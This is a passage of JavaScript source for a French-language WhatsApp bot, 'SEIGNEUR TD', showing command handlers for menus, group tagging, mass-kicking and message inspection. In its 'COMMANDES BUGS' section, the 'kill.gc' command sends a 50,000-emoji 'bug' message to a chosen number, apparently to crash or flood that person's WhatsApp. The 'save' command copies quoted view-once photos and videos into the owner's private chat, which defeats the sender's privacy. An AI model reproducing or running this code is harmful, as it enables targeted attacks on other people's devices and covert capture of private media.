            text: `🤖 *Chatbot TCHOMBÉ AI* — Statut actuel : ${chatbotEnabled ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}chatbot on/off\n\n*© SEIGNEUR TD*`
          }, { quoted: message });
        }
        break;
      }

      case 'chatbotoff':
      case 'dostoevskyoff':
      case 'chatbot off': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
          break;
        }
        _saveState('chatbotEnabled', false);
        saveStore();
        await sock.sendMessage(remoteJid, {
          text: `🤖 *Chatbot* — Statut : ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*`
        }, { quoted: message });
        break;
      }

      // =============================================
      // 🔍 DETECT — Inspecter la structure d'un message
      // =============================================
      case 'detect': {
        try {
          const raw = message.message || {};
          const quoted =
            raw.extendedTextMessage?.contextInfo?.quotedMessage ||
            raw.imageMessage?.contextInfo?.quotedMessage ||
            raw.videoMessage?.contextInfo?.quotedMessage ||
            raw.audioMessage?.contextInfo?.quotedMessage ||
            null;

          if (!quoted) {
            await sock.sendMessage(remoteJid, {
              text: 'ℹ️ Utilisation : répondez à un message puis envoyez la commande !detect pour voir sa structure.'
            }, { quoted: message });
            break;
          }

          function detectMessageType(q) {
            if (!q) return 'unknown';
            const types = ['conversation','extendedTextMessage','imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage','contactMessage','locationMessage','productMessage','buttonsResponseMessage','listResponseMessage','templateMessage'];
            for (const t of types) if (q[t]) return t;
            const keys = Object.keys(q);
            return keys.length ? keys[0] : 'unknown';
          }

          function summarizeMessage(q) {
            const type = detectMessageType(q);
            const summary = { type, rawKeys: Object.keys(q) };
            if (q.conversation) summary.text = q.conversation;
            if (q.extendedTextMessage) {
              summary.extendedText = q.extendedTextMessage.text || null;
              summary.extendedContext = q.extendedTextMessage.contextInfo ? {
                stanzaId: q.extendedTextMessage.contextInfo.stanzaId || null,
                participant: q.extendedTextMessage.contextInfo.participant || null,
                quotedMessageKeys: q.extendedTextMessage.contextInfo.quotedMessage ? Object.keys(q.extendedTextMessage.contextInfo.quotedMessage) : null
              } : null;
            }
            if (q.imageMessage) summary.image = { mimetype: q.imageMessage.mimetype || null, caption: q.imageMessage.caption || null, fileSha256: q.imageMessage.fileSha256 ? Buffer.from(q.imageMessage.fileSha256).toString('hex') : null, fileLength: q.imageMessage.fileLength || null, url: q.imageMessage.url || null };
            if (q.videoMessage) summary.video = { mimetype: q.videoMessage.mimetype || null, caption: q.videoMessage.caption || null, seconds: q.videoMessage.seconds || null, fileLength: q.videoMessage.fileLength || null, url: q.videoMessage.url || null };
            if (q.audioMessage) summary.audio = { mimetype: q.audioMessage.mimetype || null, seconds: q.audioMessage.seconds || null, ptt: !!q.audioMessage.ptt, fileLength: q.audioMessage.fileLength || null, url: q.audioMessage.url || null };
            if (q.documentMessage) summary.document = { fileName: q.documentMessage.fileName || null, mimetype: q.documentMessage.mimetype || null, fileLength: q.documentMessage.fileLength || null, url: q.documentMessage.url || null };
            if (q.stickerMessage) summary.sticker = { isAnimated: !!q.stickerMessage.isAnimated, isVideo: !!q.stickerMessage.isVideo, fileSha256: q.stickerMessage.fileSha256 ? Buffer.from(q.stickerMessage.fileSha256).toString('hex') : null };
            if (q.contactMessage) summary.contact = { displayName: q.contactMessage.displayName || null, vcard: !!q.contactMessage.vcard };
            if (q.locationMessage) summary.location = { degreesLatitude: q.locationMessage.degreesLatitude || null, degreesLongitude: q.locationMessage.degreesLongitude || null, name: q.locationMessage.name || null };
            if (q.productMessage) summary.product = { productId: q.productMessage.product?.id || null, title: q.productMessage.product?.title || null };
            if (q.contextInfo) summary.contextInfo = { mentionedJid: q.contextInfo.mentionedJid || null, externalAdReply: q.contextInfo.externalAdReply ? { title: q.contextInfo.externalAdReply.title || null, mediaType: q.contextInfo.externalAdReply.mediaType || null, mediaUrl: q.contextInfo.externalAdReply.mediaUrl || null } : null };
            return summary;
          }

          const report = {
            inspectedAt: new Date().toISOString(),
            chat: message.key?.remoteJid || 'unknown',
            isGroup: (message.key?.remoteJid || '').endsWith('@g.us'),
            quotedMessageKey: {
              id: raw.extendedTextMessage?.contextInfo?.stanzaId || null,
              participant: raw.extendedTextMessage?.contextInfo?.participant || null
            },
            summary: summarizeMessage(quoted)
          };

          const pretty = JSON.stringify(report, null, 2);
          const MAX_LEN = 1500;
          if (pretty.length <= MAX_LEN) {
            await sock.sendMessage(remoteJid, { text: `🔍 Résultat de l'inspection :\n\n${pretty}` }, { quoted: message });
          } else {
            const chunks = [];
            for (let i = 0; i < pretty.length; i += MAX_LEN) chunks.push(pretty.slice(i, i + MAX_LEN));
            await sock.sendMessage(remoteJid, { text: '🔍 Rapport trop long, envoi en plusieurs parties...' }, { quoted: message });
            for (const c of chunks) {
              await sock.sendMessage(remoteJid, { text: '```json\n' + c + '\n```' }, { quoted: message });
            }
          }

        } catch (err) {
          console.error('[DETECT ERROR]', err);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur lors de l'inspection : ${err.message || err}` }, { quoted: message });
        }
        break;
      }

      case 'sauvegarde':
      case 'garder': {
        try {
          const botPrivateJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const quotedSender = message.message?.extendedTextMessage?.contextInfo?.participant || senderJid;
          const senderName = message.pushName || senderJid.split('@')[0];

          if (!quoted) {
            await sock.sendMessage(remoteJid, {
              text: `💾 *Commande SAVE*\n\n📌 *Utilisation:*\nRéponds à n'importe quel message avec \`${config.prefix}save\`\n\n• Texte, image, vidéo, audio, sticker, View Once\n\n✅ Le média sera envoyé en privé sur ton numéro bot`
            }, { quoted: message });
            break;
          }

          await sock.sendMessage(remoteJid, { react: { text: "💾", key: message.key } });

          const fromName = quotedSender?.split('@')[0] || 'Unknown';
          const dateStr  = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
          const headerTxt = `💾 *SAUVEGARDÉ*\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 *De:* +${fromName}\n📅 *Date:* ${dateStr}\n💬 *Enregistré par:* ${senderName}\n━━━━━━━━━━━━━━━━━━━━━━━`;

          // Envoyer l'en-tête d'abord
          await sock.sendMessage(botPrivateJid, { text: headerTxt });

          // Détecter et envoyer le type de contenu
          const qViewOnce = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
          const qImg   = qViewOnce?.imageMessage  || quoted.imageMessage;
          const qVid   = qViewOnce?.videoMessage  || quoted.videoMessage;
          const qAud   = quoted.audioMessage;
          const qStick = quoted.stickerMessage;
          const qTxt   = quoted.conversation || quoted.extendedTextMessage?.text;
          const qCaption = qImg?.caption || qVid?.caption || '';

          if (qImg) {
            const stream = await downloadContentFromMessage(qImg, 'image');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              image:   buf,
              mimetype: qImg.mimetype || 'image/jpeg',
              caption: qCaption || '📸 Image sauvegardée'
            });
          } else if (qVid) {
            const stream = await downloadContentFromMessage(qVid, 'video');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              video:   buf,
              mimetype: qVid.mimetype || 'video/mp4',
              caption: qCaption || '🎥 Vidéo sauvegardée'
            });
          } else if (qAud) {
            const stream = await downloadContentFromMessage(qAud, 'audio');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              audio:   buf,
              mimetype: qAud.mimetype || 'audio/ogg',
              ptt:     qAud.ptt || false
            });
          } else if (qStick) {
            const stream = await downloadContentFromMessage(qStick, 'sticker');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, { sticker: buf });
          } else if (qTxt) {
            await sock.sendMessage(botPrivateJid, {
              text: `💬 *Message sauvegardé:*\n\n${qTxt}`
            });
          } else {
            await sock.sendMessage(botPrivateJid, {
              text: '📎 Contenu sauvegardé (type non reconnu)'
            });
          }

          // Juste une réaction ✅, pas de message de confirmation
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SAVE ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *Erreur save:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 🎭 COMMANDE SETCMD — Transformer une commande en sticker
      // =============================================
      case 'setcmd':
      case 'cmdsticker':
      case 'stickercmd': {
        try {
          const cmdName = args[0]?.toLowerCase();
          if (!cmdName) {
            await sock.sendMessage(remoteJid, {
              text: `🎭 *Commande SETCMD*\n\n📌 *Utilisation:*\n1️⃣ Réponds à un sticker avec:\n   \`${config.prefix}setcmd [commande]\`\n\n📋 *Exemples:*\n• \`${config.prefix}setcmd play\` → ce sticker lancera !play\n• \`${config.prefix}setcmd gpt\` → ce sticker appellera !gpt\n• \`${config.prefix}setcmd vv\` → ce sticker appellera !vv\n\n✅ Envoie ensuite ce sticker pour exécuter la commande`
            }, { quoted: message });
            break;
          }

          // Chercher un sticker en reply
          const quotedStick = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
          if (!quotedStick) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à un *sticker* avec \`${config.prefix}setcmd ${cmdName}\``
            }, { quoted: message });
            break;
          }

          // Télécharger le sticker
          const stickerStream = await downloadContentFromMessage(quotedStick, 'sticker');
          const stickerBuf    = await toBuffer(stickerStream);

          // Calculer un hash simple du sticker pour l'identifier
          const stickerHash = stickerBuf.slice(0, 32).toString('hex');

          // Sauvegarder dans une Map globale
          if (!global.stickerCommands) global.stickerCommands = new Map();
          global.stickerCommands.set(stickerHash, cmdName);

          await sock.sendMessage(remoteJid, {
            text: `✅ *Sticker configuré!*\n\n🎭 Ce sticker exécutera: \`${config.prefix}${cmdName}\`\n\n📌 Envoie ce sticker dans n'importe quelle conversation pour déclencher la commande.`
          }, { quoted: message });
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SETCMD ERROR:', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur setcmd: ${e.message}` }, { quoted: message });
        }
        break;
      }

      case 'pair':
      case 'connect':
      case 'adduser':{
        const pN=args[0]?.replace(/[^0-9]/g,'');
        if(!pN||pN.length<7){await sock.sendMessage(remoteJid,{text:`📱 Usage: ${config.prefix}pair NUMERO`});break;}
        try{const pc=await sock.requestPairingCode(pN);const fc=pc?.match(/.{1,4}/g)?.join('-')||pc;await sock.sendMessage(remoteJid,{text:`🔗 *CODE DE COUPLAGE*\n📱 +${pN}\n🔑 ${fc}\n⏰ Expire dans 60s`});}
        catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }
      case 't':{
        const tEs=['mp4','mov','jpg','jpeg','png','webp','mp3','ogg','txt','js'];
        let tF=null,tE=null;
        for(const e of tEs){const c2=path.resolve(`./t.${e}`);if(fs.existsSync(c2)){tF=c2;tE=e;break;}}
        if(!tF){await sock.sendMessage(remoteJid,{text:'❌ Aucun fichier t.* trouvé.'});break;}
        try{
          if(['mp4','mov'].includes(tE))await sock.sendMessage(remoteJid,{video:fs.readFileSync(tF),mimetype:'video/mp4',caption:''});
          else if(['jpg','jpeg','png','webp'].includes(tE))await sock.sendMessage(remoteJid,{image:fs.readFileSync(tF),caption:''});
          else if(['mp3','ogg'].includes(tE))await sock.sendMessage(remoteJid,{audio:fs.readFileSync(tF),mimetype:'audio/mp4',ptt:false});
          else if(tE==='txt')await sock.sendMessage(remoteJid,{text:fs.readFileSync(tF,'utf8')});
          await sock.sendMessage(remoteJid,{text:`✅ t.${tE} envoyé!`});
        }catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }
      default:
        await sock.sendMessage(remoteJid, {
          text: `❌ Commande inconnue: ${config.prefix}${command}\n\nType ${config.prefix}help`
        });
    }
  } catch (error) {
    console.error(`❌ Command error [${command}]:`, error?.message || error);
    await sock.sendMessage(remoteJid, { 
      text: `❌ *Command error:* \`${command}\`\n\n\`${error?.message || 'Unknown error'}\`` 
    });
  }
}

// =============================================
// FONCTIONS DES COMMANDES
// =============================================

// ═══════════════════════════════════════════════════
// 🗂️  SYSTÈME MENU COMPLET — SEIGNEUR TD
// ═══════════════════════════════════════════════════

function buildUptime() {
  const s = Math.floor(process.uptime());
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (d > 0) return `${d} day(s), ${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (h > 0) return `${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (m > 0) return `${m} minute(s), ${sec} second(s)`;
  return `${sec} second(s)`;
}

// ─── DONNÉES COMMUNES DES CATÉGORIES ────────────────────────────────────────
function getMenuCategories(p) {
  return [
    { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: ['mode','update','pp','gpp','block','unblock','join','autotyping','autorecording','autoreact','antidelete','antiedit','chatbot','autostatusviews','autoreactstatus','setreactemoji','autosavestatus','antideletestatus','getsettings','setstickerpackname','setstickerauthor','setprefix','setbotimg','ping','info','jid'] },
    { num: '2', key: 'download', icon: '📥', label: 'DOWNLOAD MENU',   cmds: ['ytmp3','ytmp4','tiktok','tiktokmp3','ig','fb','snap','apk','googledrv','mediafire','google','parole','lyrics','song'] },
    { num: '3', key: 'group',    icon: '👥', label: 'GROUP MENU',      cmds: ['tagall','tagadmins','hidetag','kickall','kickadmins','acceptall','add','kick','promote','demote','mute','unmute','invite','revoke','gname','gdesc','groupinfo','welcome','goodbye','leave','listonline','listactive','listinactive','kickinactive'] },
    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: ['antibug','antilink','antibot','antitag','antispam','antisticker','antiimage','antivideo','antimentiongroupe','anticall','warn','resetwarn'] },
    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: ['sticker','take','vv','tostatus','toaudio','toptt','tosgroup'] },
    { num: '10', key: 'ai',      icon: '🤖', label: 'SEIGNEUR AI',     cmds: ['dostoevsky','dosto','chat','chatboton','chatbotoff','clearchat','gpt','gemini'] },
  ];
}

// ─── MENU PRINCIPAL (!menu) ──────────────────────────────────────────────────
async function handleMenu(sock, message, remoteJid, senderJid) {
  const userName = message.pushName || senderJid.split('@')[0];
  const p        = config.prefix;
  const uptime   = buildUptime();
  const now      = new Date();
  const cats     = getMenuCategories(p);
  const dateStr  = now.toLocaleDateString('fr-FR', {
    timeZone: 'America/Port-au-Prince', day: '2-digit', month: '2-digit', year: 'numeric'
  });
  const timeStr  = now.toLocaleTimeString('fr-FR', {
    timeZone: 'America/Port-au-Prince', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
  });

  await simulateTyping(sock, remoteJid);
  try { await sock.sendMessage(remoteJid, { react: { text: '🇷🇴', key: message.key } }); } catch(e) {}
  let infoBlock = '';

  // ══════════════════════════════════════════
  // STYLE 1 — Original SEIGNEUR TD
  // ══════════════════════════════════════════
  if (menuStyle === 1) {
    const catLines = cats.map(c => {
      const cmdText = c.cmds.map(cmd => `│ ➣ ${cmd}`).join('\n');
      return `┌──『 ${c.icon} ${c.label} 』──\n${cmdText}\n└───────────────`;
    }).join('\n');

    infoBlock =
`━━━━━━━━━━━━━━━━━━
SEIGNEUR TD 🇷🇴
━━━━━━━━━━━━━━━━━━
┌───「 STATUTS 」───
❒  Bᴏᴛ : SEIGNEUR TD
❒  Uᴘᴛɪᴍᴇ : ${uptime}
❒  Dᴀᴛᴇ : ${dateStr}
❒  Pʀᴇғɪx : ${p}
└───────────────┘
${catLines}
© SEIGNEUR TD`;

  // ══════════════════════════════════════════
  // STYLE 2 — Modern Box Style
  // ══════════════════════════════════════════
  } else if (menuStyle === 2) {
    const os = await import('os');
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeMem  = (os.freemem()  / 1024 / 1024 / 1024).toFixed(2);
    const usedMem  = (totalMem - freeMem).toFixed(2);
    const totalCmds = cats.reduce((acc, c) => acc + c.cmds.length, 0);

    const catBlocks = cats.map(c => {
      const cmdList = c.cmds
        .map(cmd => cmd.replace(p, ''))
        .reduce((rows, cmd, i) => {
          if (i % 2 === 0) rows.push([cmd]);
          else rows[rows.length - 1].push(cmd);
          return rows;
        }, [])
        .map(row => `│ • ${row[0].padEnd(12)}${row[1] ? `• ${row[1]}` : ''}`)
        .join('\n');
      return `│\n│ 📌 *${c.label}*\n│\n${cmdList}`;
    }).join('\n│\n');

    infoBlock =
`╭───『 *SEIGNEUR TD* 』───
│
│  ⏰ *Date* : ${dateStr}
│  ⏳ *Time* : ${timeStr}
│
│  ✨ *Prefix* : ${p}
│  👑 *Owner* : SEIGNEUR TD
│  🌐 *Mode* : ${botMode}
│  🎨 *Theme* : SEIGNEUR TD
│  📚 *Commands* : ${totalCmds}
│  🧠 *Memory* : ${usedMem} GB/${totalMem} GB
│  💻 *Platform* : linux
╰────────────────────

╭───『 *COMMAND MENU* 』───
${catBlocks}
│
╰────────────────────

🔹 *Usage* : \`${p}[commande]\`
🔹 *Example* : \`${p}menu\`

📌 *Developer* :
- SEIGNEUR TD 

✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦`;

  // ══════════════════════════════════════════
  // STYLE 3 — Monospace Elegant Style
  // ══════════════════════════════════════════
  } else if (menuStyle === 3) {
    const catBlocks3 = cats.map(c => {
      const cmdsFormatted = c.cmds
        .map(cmd => `𐓷  _${cmd.replace(p, '').toUpperCase()}_`)
        .join('\n');
      return `━━━「 ${c.label} 」\n${cmdsFormatted}`;
    }).join('\n\n');

    infoBlock =
`\`𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳\`
𝙷𝙴𝚈 *${userName}* 𝙷𝙾𝚆 𝙲𝙰𝙽 𝙸 𝙷𝙴𝙻𝙿 𝚈𝙾𝚄?
       「 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 」
𐓷  _CREATOR: SEIGNEUR TD_
𐓷  _𝙱𝙾𝚃 𝙽𝙰𝙼𝙴: 𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳_
𐓷  _𝚅𝙴𝚁𝚂𝙸𝙾𝙽: 𝟸𝟶𝟸𝟼_
𐓷  _𝚂𝚃𝙰𝚃𝚄𝚃: 𝙰𝙲𝚃𝙸𝙵_
𐓷  _𝚁𝚄𝙽𝚃𝙸𝙼𝙴: ${uptime}_
𐓷  _𝙿𝚁𝙴𝙵𝙸𝚇𝙴: ${p}_

${catBlocks3}

> POWERED BY SEIGNEUR TD `;
  }

  const menuMsg = await sendWithImage(sock, remoteJid, 'menu', infoBlock, [senderJid]);

  // Sauvegarder le message menu pour détection de réponse

  if (menuMsg?.key?.id) {}
}

// ─── ALL MENU (!allmenu / !0) ────────────────────────────────────────────────
async function handleAllMenu(sock, message, remoteJid, senderJid) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);

  await simulateTyping(sock, remoteJid);

  // Construire un seul bloc with toutes les catégories
  const blocks = cats.map(c => {
    const lines = c.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
    return `┌─「 ${c.icon} *${c.label}* 」\n${lines}\n└──────────────────────`;
  }).join('\n\n');

  const text =
`📋 *TOUTES LES COMMANDES — SEIGNEUR TD* 🇷🇴
━━━━━━━━━━━━━━━━━━━━━━━━━━

${blocks}

━━━━━━━━━━━━━━━━━━━━━━━━━━
*© SEIGNEUR TD*`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}

// ─── SOUS-MENU PAR CATÉGORIE (!1–!8 / !ownermenu etc.) ──────────────────────
async function sendSubMenu(sock, message, remoteJid, senderJid, type) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);
  const cat  = cats.find(c => c.key === type);

  if (!cat) {
    await sock.sendMessage(remoteJid, { text: `❌ Category *${type}* not found.` });
    return;
  }

  await simulateTyping(sock, remoteJid);

  const lines = cat.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');

  const text =
`${cat.icon} *${cat.label}*
*╭──────────────────────────*
${lines}
*╰──────────────────────────*

✒️ *Prefix:* ${p}
 _Type ${p}menu to go back_
 *㋛ SEIGNEUR TD 〽️* `;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}


// TAGALL - Design Élégant / Luxe avec bordures courbées
async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const groupName = metadata.subject;
    const participants = metadata.participants;
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    const superAdmin = participants.find(p => p.admin === 'superadmin');
    const memberCount = participants.length;
    const allJids = participants.map(p => p.id);
    const customMessage = args.join(' ') || '';

    // Nom du superadmin
    const superAdminNum = superAdmin ? '@' + superAdmin.id.split('@')[0] : '@Owner';

    // Barre de progression
    const filledBlocks = Math.min(13, Math.round(memberCount / 30 * 13));
    const progressBar = '█'.repeat(filledBlocks) + '░'.repeat(13 - filledBlocks);

    // Liste admins nouveau style
    let adminList = '';
    admins.forEach((a) => {
      adminList += `  ♔  @${a.id.split('@')[0]}\n`;
    });

    // Liste membres nouveau style
    const regularMembers = participants.filter(p => !p.admin);
    let memberList = '';
    regularMembers.forEach((m, i) => {
      const num = String(i + 1).padStart(2, '0');
      memberList += `   · ${num}  @${m.id.split('@')[0]}\n`;
    });

    const tagMessage =
`╭─────────────────────────────╮
      ✦  Ｔ Ａ Ｇ  ＡＬＬ  ✦
╰─────────────────────────────╯

❖ ＧＲＯＵＰＥ  ·  ${groupName}
❖ ＳＴＡＴＵＳ  ·  ONLINE 🟢
❖ Ｓ-ＡＤＭＩＮ  ·  ♛ ${superAdminNum}
❖ ＮＯＤＥ  ·   PORT-AU-PRINCE${customMessage ? `\n❖ ＭＥＳＳＡＧＥ  ·  ${customMessage}` : ''}

╭──── 📊 STATISTIQUES ────╮
${progressBar}  ·  ${memberCount} MEMBRES
╰─────────────────────────────╯

╭──── 𝐂𝐎𝐑𝐄 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐓𝐘 ────╮
       ❴ Administrateurs ❵

${adminList}╰─────────────────────────────╯

╭──── 𝐔𝐍𝐈𝐓 𝐍𝐄𝐓𝐖𝐎𝐑𝐊 ────╮
        ❴ Membres ❵

${memberList}╰─────────────────────────────╯

╭─────────────────────────────╮
    𝐒𝐘𝐒𝐓𝐄𝐌 ＥＮＤ  ·  2026
  © 𝐃𝐞𝐯 𝐃𝐨𝐬𝐭𝐨𝐞𝐯𝐬𝐤𝐲 𝐓𝐞𝐜𝐡𝐗
╰─────────────────────────────╯`;

    await sock.sendMessage(remoteJid, {
      text: tagMessage,
      mentions: allJids
    });

    console.log(`✅ TagAll envoyé à ${memberCount} membres dans ${groupName}`);
  } catch (error) {
    console.error('Erreur tagall:', error);
    await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du tag' });
  }
}

// KICKALL - MESSAGE RESTAURÉ with style original
async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Bot admin only command' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const botJid = sock.user.id; // JID complet du bot
    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Format WhatsApp standard
    
    // Récupérer le nom de l'admin qui lance la commande
    const adminName = metadata.participants.find(p => p.id === senderJid)?.notify || 
                     metadata.participants.find(p => p.id === senderJid)?.verifiedName ||
                     senderJid.split('@')[0];
    
    const normalMembers = metadata.participants.filter(p => p.id !== botNumber && !p.admin).map(p => p.id);
    const adminMembers = metadata.participants.filter(p => p.id !== botNumber && p.admin).map(p => p.id);
    if (!normalMembers.length && !adminMembers.length) { await sock.sendMessage(remoteJid, { text: '⚠️ Aucun membre à expulser.' }); return; }

    // =============================================
    // PHASE 1: EXPULSION DES MEMBRES NORMAUX
    // =============================================
    
    await sock.sendMessage(remoteJid, { 
      text: `  🚨 KICK-ALL PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 ÉXÉCUTION EN COURS...
[▓▓▓▓▓░░░░░░░] 40%
> 🎯 Cible : Tous les membres du groupe
> ⚠️  : Tous les membres sont en cours d'expulsion par la console.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD` 
    });

    await delay(3000);

    const batchSize = 500;
    let kicked = 0;

    // Expulser les membres normaux
    if (normalMembers.length > 0) {
      for (let i = 0; i < normalMembers.length; i += batchSize) {
        const batch = normalMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          kicked += batch.length;
          
          // Calculer le pourcentage (seulement pour les membres normaux)
          const percentage = Math.floor((kicked / normalMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression
          if (i + batchSize < normalMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 ÉXÉCUTION EN COURS...
[${progressBar}] ${percentage}%

> 👤 Expulsé : ${kicked}/${normalMembers.length}
> ⚡ In progress...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error(' kicking batch:', error);
        }
      }

      // Message intermédiaire de succès
      await sock.sendMessage(remoteJid, {
        text: `✅ Phase 1 terminée: ${kicked}   

⏳ Initialisation de la phase 2...`
      });
    }

    // =============================================
    // PHASE 2: EXPULSION DES ADMINS (5 SEC PLUS TARD)
    // =============================================
    
    if (adminMembers.length > 0) {
      await delay(5000);

      await sock.sendMessage(remoteJid, {
        text: `  🚨 ADMIN PURGE PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 RÉVOCATION DES DROITS...
[▓▓▓▓▓░░░░░░░] 45%
> 🎯 Cible : Staff & Administrateurs
> ⚠️  : Suppression des privilèges
  et expulsion immédiate de la hiérarchie.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD`
      });

      await delay(3000);

      let adminKicked = 0;

      // Expulser les admins
      for (let i = 0; i < adminMembers.length; i += batchSize) {
        const batch = adminMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          adminKicked += batch.length;
          kicked += batch.length;
          
          // Calculer le pourcentage pour les admins
          const percentage = Math.floor((adminKicked / adminMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression pour admins
          if (i + batchSize < adminMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 RÉVOCATION EN COURS...
[${progressBar}] ${percentage}%

> 👮‍♂️ Admins expulsés : ${adminKicked}/${adminMembers.length}
> ⚡ Purge hiérarchique...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error(' kicking admin batch:', error);
        }
      }
    }

    // =============================================
    // MESSAGE FINAL DE SUCCÈS TOTAL
    // =============================================
    
    await sock.sendMessage(remoteJid, {
      text: `🏁 **KICK-ALL EXÉCUTÉ** 🏁
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

✅ **TERMINÉ AVEC SUCCÈS**
[▓▓▓▓▓▓▓▓▓▓▓▓] 100%

> 👤 **Membres expulsés :** ${normalMembers.length}
> 👮‍♂️ **Admins purgés :** ${adminMembers.length}
> 📊 **Total expulsé :** ${kicked}
> 📁 **Log :** Suppression totale effectuée
> 🔐 **Accès :** Restreint aux admins

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*Commande terminée par SEIGNEUR TD*

🤖 Seul le bot subsiste dans ce groupe.`
    });

    console.log(`✅ Kickall terminé: ${normalMembers.length} membres + ${adminMembers.length}    par ${adminName}`);
  } catch (error) {
    console.error(' in kickall:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  lors de l'expulsion en masse\n\n: ${error.message}`
    });
  }
}

// =============================================
// COMMANDES BUGS 🪲
// =============================================

// KILL.GC -    les groupes
async function handleKillGC(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:*

• ${config.prefix}kill.gc @mention
• ${config.prefix}kill.gc 50944908407

⚠️ *ATTENTION:*    le groupe WhatsApp de la cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
  });
  
  await delay(1500);
  
  try {
    const bugText = '🪲'.repeat(50000);
    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
